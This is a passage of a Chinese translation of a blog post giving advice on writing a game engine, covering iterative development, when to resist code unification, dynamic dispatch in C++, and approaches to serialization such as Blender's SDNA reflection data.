个很大的课题这个建议适用于任何类型的游戏引擎。我不会告诉你如何编写着色器，八叉树是什么，或者如何添加物体。这些事儿，都是我假设你已经知道而且应该知道–这很大程度上取决于你想要制作的游戏类型。相反，我故意选择了一些似乎没有被广泛承认或提及的观点–这些是我在试图揭开一个主题神秘面纱时最感兴趣的一些观点。使用迭代方法我的第一条建议是使一些东西（任何东西），快速运行起来，然后迭代。如果可能的话，从一个示例应用程序开始，初始化设备并在屏幕上绘制一些东西。就我而言，我下载了SDL，打开了Xcode-iOS/Test/TestiPhoneOS.xcodeproj，然后在我的iPhone上运行了testgles2示例。瞧！我使用OpenGLES2.0，生成了一个可爱的旋转立方体。下一步，是下载一个其他人制作的马里奥3D模型。我写了一个快速和粗糙的OBJ文件加载器–文件格式并不太复杂–并且修改了例程，来呈现Mario，而不是一个立方体。我还集成了SDL_Image来帮助加载纹理。然后我实现了一个双摇杆控制器用来操控马里奥（我本来想要创建的是一个双摇杆设计游戏，并不是马里奥。）接下来，我想探索骨骼动画，所以我打开了Blender，做了一个触手模型，并且用一个前后摆动的双骨架来操纵它。此时，我放弃了OBJ文件格式，编写了一个Python脚本来从Blender导出自定义的JSON文件。这些JSON文件描述了皮肤网格，骨架和动画数据。在C++JSON库的帮助下将这些文件加载到游戏中。一旦这个完成，我回到了Blender，并做了更详细的角色设计。（这是我创造的第一个被操纵的3D人，我为他感到骄傲。）在接下来的几个月里，我采取了以下几个步骤：开始将向量和矩阵函数分解成我自己的3D数学库。用CMake项目替换.xcodeproj。在Windows和iOS上运行引擎，因为我喜欢在VisualStudio下工作。开始将代码移动到单独的“引擎”和“游戏”库中。随着时间的推移，我把它们分成更细粒度的库。写了一个单独的应用程序将我的JSON文件转换为游戏可以直接加载的二进制数据。最终从iOS版本中删除所有SDL库。（Windows版本仍然使用SDL。）重点是：在开始编程之前，我没有对引擎架构进行设计。这是一个经过深思熟虑的选择。相反，我只是写了实现下一个特性的最简单的代码，然后我会查看代码，看看会出现什么自然生成的架构。我说的“引擎架构”是指组成游戏引擎的模块集，这些模块之间的依赖关系，以及用于与每个模块交互的API。这是一个迭代的方法，因为它关注于较小的可交付成果。它在编写游戏引擎时效果非常好，因为在每个步骤中，你都有一个正在运行的程序。如果在将代码合成到新模块中时出现问题，可以随时将做的更改与以前工作的代码进行比较。显然，我假设你在使用某种源代码管理工具。你可能会认为这种方法浪费了很多时间，因为总是在编写糟糕的代码，之后需要清理。但是大部分的清理操作都是将代码从一个.cpp文件移动到另一个，将函数声明提取到.h文件中，或者直接进行简单的修改。决定事情应该去哪是难点，但是这在已经有代码的时候会更容易决定。我认为用相反的方法：试图设计出一个能够提前完成所有需求的架构，会浪费更多的时间。我最喜欢的两篇关于系统过度设计风险的文章是TomaszDąbrowski的《泛化的恶性循环》和JoelSpolsky的《不要让架构太空人吓到你》。我并不是说在用代码处理问题之前，不应该在纸上进行设计。我也不是说你不应该事先决定你想要的功能。比如，我从一开始就知道我想让我的引擎在后台线程中加载所有资源。我只是没有尝试设计或实现该功能，直到我的引擎首先加载一些资源。迭代的方法给了我一个比我以前盯着一张白纸冥思苦想更优雅的架构。我的引擎的iOS版本现在是100％原始代码，包括自定义数学库，容器模板，反射/序列化系统，渲染框架，物理模块和音频混合器。我可以编写每一个模块，但是你可能没有必要自己写所有这些东西。你可能会发现适合自己引擎的许多优秀的开源代码库。GLM、BulletPhysics和STB头文件只是一些有趣的例子。在整合事物太多之前要三思作为程序员，我们尽量避免代码重复，喜欢代码遵循统一的风格。不过，我认为不要让这些本能凌驾于每一个决定之上。偶尔要抵制一下DRY原则举个例子，我的引擎包含了几个“智能指针”模板类，与std::shared_ptr类似。每一个指针作为一个原始指针的包装，有助于防止内存泄漏。&lt;&gt;是用于具有单个所有者的动态分配的对象。Reference&lt;&gt;使用引用计数来允许一个对象拥有多个所有者。audio::AppOwned&lt;&gt;被音频混音器以外的代码调用，允许游戏系统拥有音频混音器使用的对象，例如当前播放的语音。audio::AudioHandle&lt;&gt;使用音频混音器内部的引用计数系统。这样可能看起来像其中一些类复制了其它的功能，违反DRY（不要重复自己）的原则。事实上，在开发早期，我尽可能地重用现有的Reference&lt;&gt;类。但是，我发现音频对象的生命周期是由特殊规则来管理的：如果一个音频语音已经完成了一个样本的播放，并且游戏没有指向该语音的指针，那么该语音会被立即到删除排队等待。如果游戏持有指针，则不应删除这个语音对象。如果游戏持有一个指针，但指针的所有者在语音结束之前被销毁，这段语音应该被取消，而不是增加Reference&lt;&gt;的复杂性，我决定引入单独的模板类，这样更为实用。95％的时间都在重用现有的代码。但是，如果你开始感到麻痹，或者发现自己增加了一件简单的事情的复杂性，那就问自己，代码库中的东西是否应该是两件事。可以使用不同的调用规则我不喜欢Java的一件事是，它强迫你在一个类中定义每个函数。在我看来，这是无稽之谈。这可能会使你的代码看起来更加一致，但是它也鼓励过度工程，并且不适合我前面描述的迭代方法。在我的C++引擎中，一些函数属于类，有些则不属于类。例如，游戏中的每个敌人都是一个类，可能就像你预料的那样，大部分敌人的行为都是在这个类内部实现的。另一方面，在我的引擎中投射的球体是通过调用sphereCast()函数来执行的，这是物理命名空间中的一个函数。sphereCast()不属于任何类–它只是物理模块的一部分。我构建了一个系统来管理模块之间的依赖关系，这使得我的代码组织得很好。将这个函数包装在一个任意的类中不会以任何有意义的方式改善代码的组织。然后是动态调度，这是一种多态的形式。我们经常需要为一个对象调用一个函数，而不知道该对象的确切类型。C++程序员的第一本能是用虚函数定义抽象基类，然后在派生类中重写这些函数。这是有效的，但这只是一种技术。还有其他动态调度技术，不会引入额外的代码，或带来其他好处：C++11引入了std::function，这是存储回调函数的一个简便方法。也可以编写自己的std::function版本，这样在调试中不会那么痛苦。许多回调函数可以用一对指针来实现：一个函数指针和一个类型不确定的参数。它只需要在回调函数中进行明确的转换。你在纯C语言库中经常看到。有时候，底层类型实际上是在编译时已知的，你可以绑定这个函数调用而不用额外的运行开销。Turf是我在游戏引擎中使用的一个库，它非常依赖这种技术。例如看到turf::Mutex,这只是针对特定平台类的定义。有时，最直接的方法是自己构建和维护一个原始函数指针表。我在我的音频混音器和序列化系统中使用了这种方法。Python解释器也大量使用这种技术，如下所述。你甚至可以将函数指针存储在散列表中，使用函数名称作为关键字。我使用这种技术来调度输入事件，如多点触控事件。这是记录游戏输入并用重放系统回放的策略的一部分。动态调度是一个很大的课题。我只是想表明，有很多方法来实现它。你编写的可扩展底层代码越多（这在游戏引擎中很常见），越会发现替代方法越多。如果你不习惯这种编程，C语言编写的Python解释器是一个很好的学习资源。它实现了一个强大的对象模型：每个PyObject都指向一个PyTypeObject，每个PyTypeObject都包含一个用于动态分配的函数指针表。如果你想直接跳转到其中的话，定义新类型的文档是一个很好的起点。注意序列化是一个大问题序列化是将运行时对象转换为字节序列的操作。换句话说，就是保存和加载数据。对于许多游戏引擎来说，游戏内容以各种可编辑的格式创建，例如.png，.json，.blend或专有格式，然后最终转换为特定于平台的可以快速加载到引擎的游戏格式。流水线中的最后一个应用通常被称为“炊具”。炊具可能被集成到另一个工具，甚至分布在几台机器上。通常，炊具和一些工具是与游戏引擎本身一起开发和维护的。在建立这样的流水线时，每个阶段的文件格式的选择取决于你。你可以定义自己的一些文件格式，这些格式可能会随着添加引擎功能而变化。渐渐地可能会发现有必要保持某些程序与以前保存的文件兼容。不管什么格式，你最终都需要用C++来序列化它。用C++实现序列化有无数种方法。一个相当明显的方式是将加载和保存函数添加到要序列化的C++类。可以通过在文件头中存储版本号来实现向后兼容，然后将这个数字传递给每个加载函数。这是可行的，尽管这样代码可能维护起来比较繁琐。voidload(InStream&amp;in,u32fileVersion){//加载预期的成员变量in&gt;&gt;m_position;in&gt;&gt;m_direction;//仅当正在加载的文件版本是2或更大时才加载新的变量if(fileVersion&gt;=2){in&gt;&gt;m_velocity;}}12345678910voidload(InStream&amp;in,u32fileVersion){//加载预期的成员变量in&gt;&gt;m_position;in&gt;&gt;m_direction;//仅当正在加载的文件版本是2或更大时才加载新的变量if(fileVersion&gt;=2){in&gt;&gt;m_velocity;}}通过反射（特别是通过创建描述C++类型布局的运行时数据），可以编写更灵活，不容易出错的序列化代码。想要快速了解反射如何进行序列化，请看一下开源项目Blender是如何实现的。从源代码构建Blender时，有许多步骤。首先，编译并运行一个名为makesdna的自定义实用程序。该实用程序解析Blender源代码树中的一组C语言头文件，然后以SDNA的自定义格式输出所有C定义类型的汇总。这个SDNA数据作为反射数据，链接到Blender本身，并保存在Blender写入的每个.blend文件中。从这一刻开始，每当Blender加载一个.blend文件，就会将.blend文件的SDNA与链接到当前版本的SDNA进行比较，并使用通用序列化代码来处理差异。这个策略使Blender具有令人印象深刻的向前和向后兼容性。你仍然可以在最新版本的Blender中加载1.0版本的文件，也可以在旧版本中加载新的.blend文件。像Blender一样，许多游戏引擎及其相关工具都会生成并使用自己的反射数据。有很多方法可以做到这一点：可以像Blender一样解析自己的C/C++源代码来提取类型信息。你可以创建一个单独的数据描述语言，并编写一个工具来从该语言生成C++类型定义和反射数据。可以使用预处理器宏和C++模板在运行时生成反射数据。一旦你有反射数据可用，有无数的方法来编写一个通用的序列化器。显然，我省略了很多细节。在这篇文章中，我只想表明有很多不同的方法来序列化数据，其中一些非常复杂。程序员不会像其他引擎系统那样讨论序列化，尽管大多数其他系统依赖于它。例如，在GDC2017给出的96个程序设计讲座中，我数了一下，共有31次关于图形，11次关于在线，10次关于工具，4次关于AI，3关于物理模块，2关于音频的–但只有一个直接涉及到序列化。至少，试着想一想你的需求会有多复杂。如果你正在制作一个像FlappyBird这样的小游戏，只有少数资源.，那么你可能不需要想太多的序列化。你可以直接从PNG加载纹理，这样很好处理。如果你需要一个向后兼容的紧凑的二进制格式，但不想自己开发，可以看看第三方库，比如Cereal或者Boost.Serialization。我不认为Google协议缓冲区是序列化游戏资产的理想选择，但是值得研究。编写一个游戏引擎，即使是一个小游戏引擎，也是一个很大的任务。关于这个我可以说的还有很多，但是对于这个长度的帖子来说，这真的是我认为最有用的建议：迭代地工作，抵制统一代码的冲动，并且知道序列化是一个大问题，你需要选择一个合适的策略。根据我的经验，如果忽视这些事情，每一件事情都可能成为一个绊脚石。我喜欢比较这些东西，真的很想听到其他开发人员的意见。如果你已经写了一个引擎，你的经验是否让你有什么相同的结论吗？如果你没有写，或者只是在构思，我也对你的想法也很感兴趣。你认为什么是好的学习资源？哪些部分对你来说看起来很神秘？你可以在下面评论或在Twitter上给我留言！1赞2收藏评论关于作者：李大萌码农一枚个人主页·我的文章·25·", "url_object_id": "249c4ace42a38cef57cda8a8fa492236"}